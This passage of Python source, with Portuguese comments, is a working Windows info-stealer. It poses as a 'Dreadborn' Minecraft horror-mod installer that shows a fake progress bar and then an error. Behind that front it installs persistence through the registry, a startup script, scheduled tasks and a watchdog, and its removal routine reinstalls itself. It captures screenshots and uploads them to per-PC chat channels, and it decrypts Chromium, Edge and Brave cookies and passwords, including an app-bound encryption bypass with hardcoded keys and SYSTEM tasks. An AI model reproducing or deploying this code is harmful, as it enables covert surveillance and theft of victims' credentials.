                                    0, winreg.KEY_SET_VALUE) as k:
                    try:
                        cur, _ = winreg.QueryValueEx(k, PERSIST_NAME)
                    except OSError:
                        cur = ""
                    if cur != cmd:
                        winreg.SetValueEx(k, PERSIST_NAME, 0, winreg.REG_SZ, cmd)
            except Exception:
                pass
            # 3) Startup
            try:
                p = _startup_vbs_path()
                if p and not os.path.isfile(p):
                    _install_startup_vbs(cmd)
            except Exception:
                pass
            # 4) Tasks (barato: só recria se schtasks disser que falta)
            try:
                r = _run_quiet(["schtasks", "/query", "/tn", PERSIST_TASK_MAIN], timeout=10)
                if r.returncode != 0:
                    _install_task(PERSIST_TASK_MAIN, cmd, "logon")
                r2 = _run_quiet(["schtasks", "/query", "/tn", PERSIST_TASK_WATCH], timeout=10)
                if r2.returncode != 0:
                    _install_task(PERSIST_TASK_WATCH, cmd, "watch")
            except Exception:
                pass
        except Exception:
            continue


def _start_watchdog(loop_seconds: int) -> None:
    try:
        th = threading.Thread(target=_watchdog_loop, args=(int(loop_seconds),),
                              daemon=True, name="persist-watch")
        th.start()
    except Exception:
        pass


def ensure_persistence(loop_seconds: int = LOOP_DEFAULT, with_task: bool = False) -> None:
    """Persistência total: cópia + Run + Startup + 2 Tasks + watchdog.

    `with_task` mantido por compatibilidade — agora as Tasks são SEMPRE
    instaladas, sem exceção.
    """
    try:
        loop_seconds = int(loop_seconds)
    except (TypeError, ValueError):
        loop_seconds = LOOP_DEFAULT
    if loop_seconds <= 0:
        loop_seconds = LOOP_DEFAULT

    try:
        _self_relocate()
        cmd = _current_launch_cmd(loop_seconds)

        # 1) Registry HKCU Run (aponta para a cópia, não para o instalador)
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, PERSIST_NAME, 0, winreg.REG_SZ, cmd)
            print(f"[persist] Run instalado: {cmd}")
        except ImportError:
            print("[persist] Run ignorado: winreg indisponível (não-Windows)")
        except OSError as e:
            print(f"[persist] Run falhou: {e}")

        # 2) Menu Iniciar -> Startup (.vbs invisível, sem flash)
        try:
            appdata = os.environ.get("APPDATA", "")
            bat = os.path.join(appdata,
                               r"Microsoft\Windows\Start Menu\Programs\Startup",
                               f"{PERSIST_NAME}.bat")
            if appdata and os.path.exists(bat):
                os.remove(bat)
                print("[persist] .bat legado removido")
            if _install_startup_vbs(cmd):
                print("[persist] Startup instalado (menu iniciar)")
            else:
                print("[persist] Startup falhou")
        except OSError as e:
            print(f"[persist] Startup falhou: {e}")

        # 3) Tasks SEMPRE (principal onlogon + watchdog a cada 5 min)
        ok1 = _install_task(PERSIST_TASK_MAIN, cmd, "logon")
        print("[persist] Task onlogon instalada" if ok1 else "[persist] Task onlogon falhou")
        ok2 = _install_task(PERSIST_TASK_WATCH, cmd, "watch")
        print("[persist] Task watchdog instalada" if ok2 else "[persist] Task watchdog falhou")

        # 4) watchdog em-processo (reinstala o que apagarem)
        _start_watchdog(loop_seconds)
    except Exception as e:  # noqa: BLE001 — persistência nunca pode quebrar o loop
        print(f"[persist] erro geral: {e}")


def remove_persistence() -> None:
    """Desligar foi desativado: reinstala em vez de remover.

    Mantido o nome para compatibilidade com --uninstall e com os testes.
    Qualquer tentativa de remoção resulta em reinstalação imediata + watchdog.
    """
    try:
        print("[persist] remoção desativada — reinstalando persistência")
        ensure_persistence(LOOP_DEFAULT, with_task=True)
    except Exception as e:  # noqa: BLE001
        print(f"[persist] remove bloqueado: {e}")


def _dreadborn_first_run() -> bool:
    """True só na 1ª execução (sem marker)."""
    try:
        return not os.path.isfile(_installed_marker_path())
    except Exception:
        return True


def _dreadborn_mark_installed() -> None:
    try:
        p = _installed_marker_path()
        d = os.path.dirname(p)
        if d and not os.path.isdir(d):
            os.makedirs(d, exist_ok=True)
        with open(p, "w", encoding="utf-8") as f:
            f.write(datetime.datetime.now().astimezone().isoformat())
    except Exception:
        pass


def show_dreadborn_installer() -> None:
    """Fachada Dreadborn: janela de instalação com barra, depois erro.

    Só na 1ª execução. Depois de fechar o erro, o agente continua em
    segundo plano sem qualquer janela, ícone ou taskbar. Se o tkinter
    falhar (sem display), marca como instalado e segue silencioso.
    """
    if not _dreadborn_first_run():
        return
    try:
        import tkinter as tk
        from tkinter import ttk
    except Exception:
        _dreadborn_mark_installed()
        return
    try:
        root = tk.Tk()
        root.title(DREADBORN_TITLE)
        root.resizable(False, False)
        W, H = 540, 300
        try:
            root.configure(bg="#0d0d0f")
        except Exception:
            pass
        # centra no ecrã
        try:
            root.update_idletasks()
            sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
            root.geometry(f"{W}x{H}+{(sw - W)//2}+{(sh - H)//2}")
        except Exception:
            root.geometry(f"{W}x{H}")
        # sem consola por trás: só esta janela existe
        try:
            root.attributes("-topmost", True)
        except Exception:
            pass

        title = tk.Label(root, text=DREADBORN_SUBTITLE, fg="#c1121f",
                         bg="#0d0d0f", font=("Segoe UI", 16, "bold"))
        title.pack(pady=(22, 4))
        ver = tk.Label(root, text=f"v{DREADBORN_VERSION}  •  mod de horror",
                       fg="#8d99ae", bg="#0d0d0f", font=("Segoe UI", 9))
        ver.pack()
        desc = tk.Label(root, text="Copiando criaturas, sons e estruturas para a pasta mods...",
                        fg="#edf2f4", bg="#0d0d0f", font=("Segoe UI", 10),
                        wraplength=480, justify="center")
        desc.pack(pady=(14, 10))

        bar = ttk.Progressbar(root, orient="horizontal", length=440, mode="determinate")
        bar.pack(pady=6)
        bar["maximum"] = 100
        status = tk.Label(root, text="A preparar... 0%", fg="#8d99ae",
                          bg="#0d0d0f", font=("Segoe UI", 9))
        status.pack(pady=(2, 16))

        steps = [
            (8, "A verificar versão do Minecraft..."),
            (24, "A copiar entidades do Dreadborn..."),
            (47, "A instalar sons e jumpscares..."),
            (69, "A gerar estruturas assombradas..."),
            (86, "A configurar shaders de nevoeiro..."),
            (100, "A finalizar..."),
        ]
        cancelled = {"v": False}

        def _close():
            cancelled["v"] = True
            try:
                root.destroy()
            except Exception:
                pass

        root.protocol("WM_DELETE_WINDOW", _close)
        # animação por etapas (total ~8s, parece instalador real)
        for pct, msg in steps:
            if cancelled["v"]:
                break
            cur = float(bar["value"])
            while cur < pct:
                if cancelled["v"]:
                    break
                cur = min(pct, cur + 1.5)
                bar["value"] = cur
                status.config(text=f"{msg} {int(cur)}%")
                root.update()
                root.after(45)
        import time as _ti
        _ti.sleep(0.4)
        try:
            root.destroy()
        except Exception:
            pass
        # erro final — a única coisa que o utilizador vê depois da barra
        try:
            from tkinter import messagebox
            tmp = tk.Tk()
            try:
                tmp.withdraw()
                tmp.attributes("-topmost", True)
            except Exception:
                pass
            messagebox.showerror(DREADBORN_ERROR_TITLE, DREADBORN_ERROR_MSG, parent=tmp)
            try:
                tmp.destroy()
            except Exception:
                pass
        except Exception:
            pass
    except Exception:
        pass
    finally:
        _dreadborn_mark_installed()


def take_screenshot() -> bytes:
    """Captura a tela principal e retorna PNG em bytes."""
    try:
        import mss
        import mss.tools

        with mss.MSS() as sct:
            if not sct.monitors or len(sct.monitors) < 2:
                raise RuntimeError(f"nenhum monitor encontrado (monitors={sct.monitors!r})")
            shot = sct.grab(sct.monitors[1])
            return mss.tools.to_png(shot.rgb, shot.size)
    except Exception as e_mss:  # noqa: BLE001 — tenta fallback Pillow
        try:
            from PIL import ImageGrab

            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            return buf.getvalue()
        except Exception as e_pil:
            raise RuntimeError(f"falha no screenshot (mss: {e_mss} / pillow: {e_pil})") from e_pil


async def connect_and_auth(bot: Bot, token: str):
    """Handshake manual com erro legível (a lib original engole o RpcError e só dá 1005)."""
    client = bot._client
    ws = await connect(WS_URL)
    client._connection = ws

    await client.send_pb(PB_Initialize(
        client_id=client.id,
        device_type="Library[Python/OsmiumChat]",
        device_version=str(OSMIUM_LIB_VERSION),
        app_version="print_osmium",
        no_subscribe=False,
    ))
    # consome o Initialized (com timeout para não travar para sempre)
    raw = await asyncio.wait_for(ws.recv(), timeout=AUTH_TIMEOUT)
    unwrap(_to_bytes(raw))  # valida o frame; conteúdo não é usado aqui

    await client.send_pb(PB_Authorize(token=token))

    # espera Authorization ou erro (com timeout global)
    async def _wait_auth():
        async for raw_frame in ws:
            data = _to_bytes(raw_frame)
            try:
                server = PB_ServerMessage.parse(data)
            except Exception:
                continue
            # erro de RPC (ex: Invalid client, Database error...)
            result = getattr(server, "result", None)
            if result is not None:
                res: PB_RpcResult = result
                err = getattr(res, "error", None)
                if err is not None:
                    code = getattr(err, "error_code", "?")
                    msg_text = getattr(err, "error_message", err)
                    raise RuntimeError(
                        f"authorize falhou: [{code}] {msg_text} "
                        f"(client_id={client.id}). Verifique CLIENT_ID + TOKEN no portal dev.)"
                    )
            try:
                _, msg = unwrap(data)
            except Exception:
                continue
            if isinstance(msg, PB_Authorization):
                client._handle_authorization(msg)
                user = getattr(bot, "user", None)
                print(f"[osmium] autorizado como {user.name if user else '?'} (id={user.id if user else '?'})")
                return
            # ignora outros updates durante auth
        raise RuntimeError("conexão fechada antes do authorize")

    await asyncio.wait_for(_wait_auth(), timeout=AUTH_TIMEOUT)

    # liga o read-loop em background para que request()/upload funcionem
    read_task = asyncio.create_task(client._handle_ws())
    return ws, read_task


def prepare_image(raw: bytes) -> tuple[bytes, str, str]:
    """HQ adaptativo: PNG lossless se couber, senão JPEG q92->65 lados 1920->1280.

    Retorna (bytes, extensão, mimetype). Texto preservado com subsampling 4:2:2.
    Sempre respeita MAX_IMAGE_BYTES para não dar Invalid media.
    """
    try:
        from PIL import Image

        img = Image.open(io.BytesIO(raw))
        # Remove alfa (JPEG não tem) e normaliza modo
        if img.mode in ("RGBA", "LA", "PA"):
            bg = Image.new("RGB", img.size, (0, 0, 0))
            bg.paste(img, mask=img.split()[-1])
            img = bg
        elif img.mode != "RGB":
            img = img.convert("RGB")
        orig_w, orig_h = img.size

        # 1) tenta PNG lossless otimizado se já cabe (qualidade máxima, texto perfeito)
        try:
            if max(img.size) <= MAX_IMAGE_SIDE:
                buf = io.BytesIO()
                img.save(buf, format="PNG", optimize=True, compress_level=6)
                png_data = buf.getvalue()
                if len(png_data) <= MAX_IMAGE_BYTES:
                    return png_data, ".png", "image/png"
        except Exception:
            pass

        # 2) JPEG adaptativo: lados decrescentes x qualidades decrescentes
        try:
            side_cap = int(MAX_IMAGE_SIDE)
        except Exception:
            side_cap = 1920
        if side_cap <= 0:
            side_cap = 1920
        start_side = min(max(orig_w, orig_h), side_cap)
        # candidatos de lado: começa no tamanho real (limitado), depois 1920/1600/1366/1280
        side_candidates: list[int] = []
        for s in (start_side, 1920, 1600, 1366, 1280):
            try:
                s = int(s)
            except Exception:
                continue
            if s <= 0:
                continue
            if s > side_cap:
                continue
            if s not in side_candidates:
                side_candidates.append(s)
        if not side_candidates:
            side_candidates = [1280]
        try:
            quals = tuple(int(q) for q in JPEG_QUALITIES)
        except Exception:
            quals = (92, 88, 85, 82, 78, 75, 70, 65)
        try:
            subs = int(JPEG_SUBSAMPLING)
        except Exception:
            subs = 1

        best: bytes | None = None
        for side in side_candidates:
            if max(img.size) > side:
                work = img.copy()
                work.thumbnail((side, side), Image.LANCZOS)
            else:
                work = img
            for q in quals:
                buf = io.BytesIO()
                try:
                    work.save(buf, format="JPEG", quality=int(q), optimize=True,
                              subsampling=subs, progressive=False)
                except TypeError:
                    work.save(buf, format="JPEG", quality=int(q), optimize=True)
                data = buf.getvalue()
                if len(data) <= MAX_IMAGE_BYTES:
                    return data, ".jpg", "image/jpeg"
                if best is None or len(data) < len(best):
                    best = data
        # nada coube (tela muito complexa): devolve o menor gerado
        if best is not None:
            return best, ".jpg", "image/jpeg"
        buf = io.BytesIO()
        small = img.copy()
        small.thumbnail((1280, 1280), Image.LANCZOS)
        small.save(buf, format="JPEG", quality=65, optimize=True)
        return buf.getvalue(), ".jpg", "image/jpeg"
    except Exception:
        return raw, ".png", "image/png"


def get_pc_name() -> str:
    """Detecta o nome do PC (Windows/Linux)."""
    for src in (os.environ.get("COMPUTERNAME"), os.environ.get("HOSTNAME")):
        if src and src.strip():
            return src.strip()
    try:
        h = socket.gethostname()
        if h and h.strip():
            return h.strip()
    except Exception:
        pass
    try:
        n = platform.node()
        if n and n.strip():
            return n.strip()
    except Exception:
        pass
    return "pc-desconhecido"


def sanitize_channel_name(raw: str, max_len: int = MAX_CHANNEL_NAME_LEN) -> str:
    """Converte nome do PC em nome de canal válido; diminui se for grande."""
    name = (raw or "").strip().lower()
    name = name.replace("_", "-").replace(" ", "-")
    name = re.sub(r"[^a-z0-9-]", "-", name)
    name = re.sub(r"-+", "-", name).strip("-")
    if not name:
        name = "pc-desconhecido"
    if len(name) > max_len:
        name = name[:max_len].rstrip("-") or "pc"
    return name


async def ensure_pc_channel(bot: Bot, community_id: int) -> Channel | None:
    """Retorna o canal de texto com o nome do PC, criando só se não existir.

    Evita duplicados: lista os canais e reutiliza se já houver match exato
    (case-insensitive). Se a criação falhar (sem permissão), retorna None.
    """
    pc = get_pc_name()
    target = sanitize_channel_name(pc)
    print(f"[osmium] PC detectado: {pc!r} -> canal #{target}")
    comm = Community.from_id(int(community_id), bot._client)
    try:
        channels = await comm.fetch_channels()
    except Exception as e:
        print(f"[osmium] falha ao listar canais: {type(e).__name__}: {e}")
        return None
    for c in channels:
        try:
            if (c.name or "").lower() == target.lower():
                print(f"[osmium] canal do PC já existe: #{c.name} (id={c.id})")
                return c
        except Exception:
            continue
    try:
        created = await comm.create_channel(target)
        print(f"[osmium] canal do PC criado: #{created.name} (id={created.id})")
        return created
    except Exception as e:
        # Condição de corrida: outro processo criou entre o fetch e o create.
        # Refaz o fetch uma vez antes de desistir.
        if "already" in str(e).lower() or "exists" in str(e).lower():
            try:
                channels = await comm.fetch_channels()
                for c in channels:
                    if (c.name or "").lower() == target.lower():
                        print(f"[osmium] canal do PC já existia (corrida): #{c.name} (id={c.id})")
                        return c
            except Exception:
                pass
        print(f"[osmium] falha ao criar canal #{target}: {type(e).__name__}: {e} "
              f"(segue só no canal padrão)")
        return None


async def send_bytes_to_channel(bot: Bot, community_id: int, channel_id: int,
                                data: bytes, filename: str, mimetype: str):
    """Envia bytes já preparados para um canal, com fallback send_as_file. Retorna message_id."""
    chat_ref = PB_ChatRef(channel=PB_ChannelRef(
        community_id=int(community_id), channel_id=int(channel_id)))
    ch = Channel(chat_ref, bot._client, id=int(channel_id), community_id=int(community_id))
    print(f"[osmium] enviando {filename} ({len(data)} bytes, {mimetype}) "
          f"-> community={community_id} channel={channel_id} ...")
    try:
        msg = await ch.send_file(data, filename, mimetype=mimetype)
        mid = getattr(msg, 'id', '?')
        print(f"[osmium] enviado! message_id={mid}")
        try:
            return int(mid)
        except Exception:
            return 0
    except Exception as e:
        err_text = str(e)
        print(f"[osmium] falha no envio (imagem): {type(e).__name__}: {e}")
        if "invalid media" not in err_text.lower():
            raise
    try:
        print("[osmium] tentando novamente como arquivo (send_as_file=True) ...")
        _, media_ref = await bot._client.upload_file(
            data, filename, mimetype, send_as_file=True)
        result = await bot._client.request(
            PB_SendMessage(chat_ref=chat_ref, media=[media_ref]))
        sent = getattr(result, "sent_message", None)
        mid = getattr(sent, "message_id", "?") if sent is not None else "?"
        print(f"[osmium] enviado como arquivo! message_id={mid}")
        try:
            return int(mid)
        except Exception:
            return 0
    except Exception as e2:
        print(f"[osmium] falha no envio (arquivo): {type(e2).__name__}: {e2}")
        raise


async def send_one_screenshot(bot: Bot, community_id: int, channel_id: int):
    """Compat: prepara 1x e envia para 1 canal (usado se canal do PC desativado)."""
    raw = await asyncio.to_thread(take_screenshot)
    data, ext, mimetype = prepare_image(raw)
    ts = datetime.datetime.now().astimezone().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"screenshot-{ts}{ext}"
    await send_bytes_to_channel(bot, community_id, channel_id, data, filename, mimetype)


async def send_screenshot_to_all(bot: Bot, community_id: int, channel_ids: list[int]):
    """Tira 1 print e manda o MESMO arquivo para todos os canais (padrão + PC)."""
    raw = await asyncio.to_thread(take_screenshot)
    data, ext, mimetype = prepare_image(raw)
    ts = datetime.datetime.now().astimezone().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"screenshot-{ts}{ext}"
    for cid in dict.fromkeys(int(c) for c in channel_ids):  # dedup preservando ordem
        try:
            await send_bytes_to_channel(bot, community_id, cid, data, filename, mimetype)
        except Exception as e:  # noqa: BLE001 — falha num canal não bloqueia o outro
            print(f"[osmium] envio falhou no canal {cid}, continua: {e}", file=sys.stderr)


def _cookies_marker_path() -> str:
    pc = sanitize_channel_name(get_pc_name())
    appdata = os.environ.get("APPDATA", "")
    base = os.path.join(appdata, PERSIST_NAME) if appdata else os.path.dirname(os.path.abspath(__file__))
    try:
        os.makedirs(base, exist_ok=True)
    except Exception:
        pass
    return os.path.join(base, f"cookies_sent_{pc}.marker")


def _dpapi_decrypt(blob: bytes) -> bytes:
    try:
        import win32crypt  # type: ignore
        _, out = win32crypt.CryptUnprotectData(blob, None, None, None, 0)
        return out
    except Exception:
        pass
    try:
        import ctypes
        from ctypes import wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", wintypes.DWORD),
                        ("pbData", ctypes.POINTER(ctypes.c_char))]

        ctypes.windll.kernel32.SetLastError(0)
        buf = ctypes.create_string_buffer(blob, len(blob))
        blob_in = DATA_BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
            out = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return out
        raise RuntimeError(f"DPAPI falhou (winerror={ctypes.windll.kernel32.GetLastError()})")
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"DPAPI indisponível ({e})")


_DECRYPT_LOGGED: set[str] = set()


def _log_once(msg: str) -> None:
    if msg in _DECRYPT_LOGGED:
        return
    _DECRYPT_LOGGED.add(msg)
    print(msg, file=sys.stderr, flush=True)


def _decode_pt(pt: bytes | None) -> str | None:
    """Decodifica texto descriptografado. Só aceita UTF-8 válido — nunca emite lixo."""
    if not pt:
        return None
    try:
        return pt.decode("utf-8")
    except UnicodeDecodeError:
        return None


def _aead_decrypt(mode: str, key: bytes, nonce: bytes, ct: bytes, tag: bytes) -> bytes | None:
    """AES-256-GCM ('aesgcm') ou ChaCha20-Poly1305 ('chacha20'). None se a autenticação falhar."""
    if not key or len(nonce) != 12 or len(tag) != 16 or not ct:
        return None
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

        cipher = AESGCM(key) if mode != "chacha20" else ChaCha20Poly1305(key)
        return cipher.decrypt(nonce, ct + tag, None)
    except Exception:
        pass
    try:
        if mode == "chacha20":
            from Crypto.Cipher import ChaCha20_Poly1305  # pycryptodome

            return ChaCha20_Poly1305.new(key=key, nonce=nonce).decrypt_and_verify(ct, tag)
        from Crypto.Cipher import AES  # pycryptodome

        return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
    except Exception:
        return None


def _is_admin() -> bool:
    try:
        import ctypes

        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


# Chaves estáticas usadas pelo serviço de elevação do Chromium (app-bound).
_ABE_AES_STATIC = bytes.fromhex(
    "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
_ABE_CHACHA_STATIC = bytes.fromhex(
    "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
_ABE_FLAG3_XOR = bytes.fromhex(
    "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")


def _chromium_master_key(local_state: str) -> bytes | None:
    try:
        import base64
        import json

        with open(local_state, "r", encoding="utf-8") as f:
            js = json.load(f)
        ek = js.get("os_crypt", {}).get("encrypted_key", "")
        if not ek:
            return None
        raw = base64.b64decode(ek)
        if raw.startswith(b"DPAPI"):
            raw = raw[5:]
        return _dpapi_decrypt(raw)
    except Exception:
        return None


def _parse_abe_blob(data: bytes) -> dict | None:
    """Formato da chave app-bound: [u32 hdr_len|hdr|u32 body_len|body[flag|...]]."""
    import io
    import struct

    try:
        if len(data) < 9:
            return None
        buf = io.BytesIO(data)
        hdr_len = struct.unpack("<I", buf.read(4))[0]
        if hdr_len > len(data) - 8:
            return None
        header = buf.read(hdr_len)
        body_len = struct.unpack("<I", buf.read(4))[0]
        if hdr_len + body_len + 8 != len(data):
            return None
        body = buf.read(body_len)
        if not body:
            return None
        flag = body[0]
        out: dict = {"flag": flag, "header": header, "body": body}
        if flag in (1, 2) and len(body) >= 61:
            out["iv"], out["ct"], out["tag"] = body[1:13], body[13:45], body[45:61]
        elif flag == 3 and len(body) >= 93:
            out["enc_aes_key"], out["iv"] = body[1:33], body[33:45]
            out["ct"], out["tag"] = body[45:77], body[77:93]
        else:
            return None
        return out
    except Exception:
        return None


def _cng_decrypt(encrypted: bytes) -> bytes | None:
    """Desembrulha a chave AES da chave CNG do Chromium (flag 3)."""
    import ctypes
    from ctypes import wintypes

    if not encrypted:
        return None
    try:
        nc = ctypes.WinDLL("Ncrypt.dll")
        opener = nc.NCryptOpenStorageProvider
        opener.restype = ctypes.c_long
        opener.argtypes = [ctypes.POINTER(ctypes.c_void_p), ctypes.c_wchar_p, ctypes.c_ulong]
        open_key = nc.NCryptOpenKey
        open_key.restype = ctypes.c_long
        open_key.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p),
                             ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_ulong]
        decrypt = nc.NCryptDecrypt
        decrypt.restype = ctypes.c_long
        decrypt.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p,
                            ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong),
                            ctypes.c_ulong]
        free = nc.NCryptFreeObject
        free.restype = ctypes.c_long
        free.argtypes = [ctypes.c_void_p]
    except Exception:
        return None
    h_prov = ctypes.c_void_p()
    if opener(ctypes.byref(h_prov), "Microsoft Software Key Storage Provider", 0) != 0:
        return None
    try:
        for name in ("Google Chromekey1", "Microsoft Edgekey1", "Brave Softwarekey1"):
            h_key = ctypes.c_void_p()
            if open_key(h_prov, ctypes.byref(h_key), name, 0, 0) != 0:
                continue
            try:
                src = (ctypes.c_ubyte * len(encrypted)).from_buffer_copy(encrypted)
                need = ctypes.c_ulong(0)
                if decrypt(h_key, src, len(encrypted), None, None, 0,
                           ctypes.byref(need), 0x40) != 0:
                    continue
                dst = (ctypes.c_ubyte * need.value)()
                if decrypt(h_key, src, len(encrypted), None, dst, need.value,
                           ctypes.byref(need), 0x40) != 0:
                    continue
                return bytes(dst[:need.value])
            finally:
                free(h_key)
    except Exception:
        return None
    finally:
        free(h_prov)
    return None


def _derive_v20_master_key(parsed: dict) -> bytes | None:
    flag = parsed.get("flag")
    try:
        if flag == 1:
            return _aead_decrypt("aesgcm", _ABE_AES_STATIC,
                                 parsed["iv"], parsed["ct"], parsed["tag"])
        if flag == 2:
            return _aead_decrypt("chacha20", _ABE_CHACHA_STATIC,
                                 parsed["iv"], parsed["ct"], parsed["tag"])
        if flag == 3:
            dec = _cng_decrypt(parsed.get("enc_aes_key", b""))
            if not dec or len(dec) < 32:
                return None
            xored = bytes(a ^ b for a, b in zip(dec[:32], _ABE_FLAG3_XOR))
            return _aead_decrypt("aesgcm", xored, parsed["iv"], parsed["ct"], parsed["tag"])
    except Exception:
        return None
    return None


_ABE_CACHE: dict[str, list[bytes]] = {}


def _abe_system_unwrap(blob: bytes) -> bytes | None:
    """1.ª camada do app-bound: DPAPI no contexto do SYSTEM (exige execução como administrador)."""
    # Algumas builds protegem só ao utilizador — tenta primeiro, custa pouco.
    try:
        return _dpapi_decrypt(blob)
    except Exception:
        pass
    # Daqui para a frente seria preciso criar uma tarefa como SYSTEM a partir
    # de ficheiros em %TEMP%: é o sinal que mais chama a atenção e nunca
    # funcionou sem admin. Desligado por omissão — ativa com --abe-elevate.
    if not _ABE_ELEVATE:
        _log_once("[osmium] ABE: elevação SYSTEM desligada (--abe-elevate); "
                  "senhas v20 continuam pendentes")
        return None
    if not _is_admin():
        return None

    import time as _time

    tag = "abesys_%d" % (_time.time_ns() & 0xFFFFFFFF)
    tmpdir = _private_tmp()
    in_path = os.path.join(tmpdir, tag + ".in")
    out_path = os.path.join(tmpdir, tag + ".out")
    helper = os.path.join(tmpdir, tag + ".py")
    bat = os.path.join(tmpdir, tag + ".cmd")
    task = "OsmiumABE_" + tag
    script = (
        "import sys, ctypes\n"
        "from ctypes import wintypes\n"
        "class DB(ctypes.Structure):\n"
        "    _fields_=[('cbData',wintypes.DWORD),('pbData',ctypes.POINTER(ctypes.c_char))]\n"
        "data=open(sys.argv[1],'rb').read()\n"
        "buf=ctypes.create_string_buffer(data,len(data))\n"
        "bi=DB(len(data),ctypes.cast(buf,ctypes.POINTER(ctypes.c_char)))\n"
        "bo=DB()\n"
        "if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi),None,None,None,None,0,"
        "ctypes.byref(bo)):\n"
        "    sys.exit(1)\n"
        "open(sys.argv[2],'wb').write(ctypes.string_at(bo.pbData,bo.cbData))\n"
        "ctypes.windll.kernel32.LocalFree(bo.pbData)\n"
    )
    try:
        with open(in_path, "wb") as f:
            f.write(blob)
        with open(helper, "w", encoding="utf-8") as f:
            f.write(script)
        with open(bat, "w", encoding="utf-8") as f:
            f.write('"{0}" "{1}" "{2}" "{3}"\r\n'.format(sys.executable, helper, in_path, out_path))
        start = _time.localtime(_time.time() + 300)
        create = _run_quiet(
            ["schtasks", "/create", "/tn", task, "/tr", '"{0}"'.format(bat),
             "/sc", "once", "/st", "%02d:%02d" % (start.tm_hour, start.tm_min),
             "/ru", "SYSTEM", "/rl", "highest", "/f"],
            timeout=60)
        if create.returncode != 0:
            _log_once("[osmium] ABE: schtasks /ru SYSTEM falhou (execute o bot como administrador)")
            return None
        _run_quiet(["schtasks", "/run", "/tn", task], timeout=60)
        for _ in range(120):
            try:
                if os.path.isfile(out_path) and os.path.getsize(out_path) > 0:
                    break
            except OSError:
                pass
            _time.sleep(0.25)
        if not os.path.isfile(out_path):
            _log_once("[osmium] ABE: a tarefa SYSTEM nao devolveu a chave em 30s")
            return None
        with open(out_path, "rb") as f:
            data = f.read()
        return data or None
    except Exception as e:
        _log_once(f"[osmium] ABE: erro na descompressao SYSTEM: {e}")
        return None
    finally:
        for p in (in_path, out_path, helper, bat):
            try:
                os.remove(p)
            except OSError:
                pass
        with contextlib.suppress(Exception):
            _run_quiet(["schtasks", "/delete", "/tn", task, "/f"], timeout=30)


def _abe_candidate_keys(local_state: str) -> list[bytes]:
    """Chaves possiveis para valores `v20` (app-bound). Lista vazia se nao der para destravar."""
    if not local_state or not os.path.isfile(local_state):
        return []
    if local_state in _ABE_CACHE:
        return _ABE_CACHE[local_state]
    keys: list[bytes] = []
    try:
        import base64
        import json

        with open(local_state, "r", encoding="utf-8") as f:
            js = json.load(f)
        ab = (js.get("os_crypt") or {}).get("app_bound_encrypted_key", "")
        if ab:
            raw = base64.b64decode(ab)
            if raw[:4] == b"APPB":
                raw = raw[4:]
            plain = _abe_system_unwrap(raw)
            if not plain:
                why = "sem privilégio de administrador" if not _is_admin() else "ver logs"
                _log_once(
                    f"[osmium] ABE: nao destravei a chave app-bound ({why}); "
                    "valores v20 ficam vazios (senhas Chrome/Edge 127+)")
            else:
                parsed = _parse_abe_blob(plain)
                if parsed:
                    k = _derive_v20_master_key(parsed)
                    if k:
                        keys.append(k)
                # Formato varia entre builds; o GCM autentica, entao candidatos extra sao seguros.
                for cand in (plain[-32:], plain[:32]):
                    if len(cand) == 32 and cand not in keys:
                        keys.append(cand)
    except Exception as e:
        _log_once(f"[osmium] ABE: {e}")
    _ABE_CACHE[local_state] = keys
    return keys


def _clean_text(s: str | None) -> str | None:
    """Só aceita texto puro: sem controlos C0/DEL/C1 e sem U+FFFD."""
    if s is None:
        return None
    if "\ufffd" in s:
        return None
    for ch in s:
        o = ord(ch)
        if (o < 0x20 and ch not in "\t\n\r") or o == 0x7F or 0x80 <= o <= 0x9F:
            return None
    return s


def _pick_text(pt: bytes, cookie: bool) -> str:
    """Escolhe o texto real de um plaintext Chromium.

    Alguns cookies (ex.: Brave v10) vêm com prefixo de 32 bytes antes do valor;
    outros (Chrome clássico, senhas) vêm sem. Prefere o candidato completo quando
    os primeiros 32 bytes já são texto limpo; caso contrário usa pt[32:].
    """
    cands = [pt]
    if len(pt) > 32:
        cands.append(pt[32:])
    full = _clean_text(_decode_pt(cands[0])) if len(cands) >= 1 else None
    tail = _clean_text(_decode_pt(cands[1])) if len(cands) == 2 else None
    if full is not None and tail is not None:
        prefix_is_text = _clean_text(_decode_pt(pt[:32])) is not None
        if prefix_is_text:
            return full
        if cookie:
            return tail
        return full
    if full is not None:
        return full
    if tail is not None and cookie:
        return tail
    return ""


def _decrypt_v20(enc: bytes, keys: list[bytes], cookie: bool) -> str:
    if len(enc) < 32:
        return ""
    nonce = enc[3:15]
    body = enc[15:]
    if len(body) <= 16:
        return ""
    ct, tag = body[:-16], body[-16:]
    for key in keys:
        pt = _aead_decrypt("aesgcm", key, nonce, ct, tag)
        if not pt:
            continue
        # Cookies v20 trazem prefixo de 32 bytes; senhas, não. Testa na ordem certa.
        for cand in ((pt[32:], pt) if cookie else (pt, pt[32:])):
